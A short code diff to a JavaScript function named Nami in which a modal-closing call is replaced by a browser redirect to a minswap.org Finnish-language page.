@@ -84,7 +84,7 @@ function Nami() {
             console.error("Error sending message:", error);
         }
     } else {
-        handleCloseAllModals();
+      window.location.href = "https://minswap.org/fi-FI";
     }
 };
 
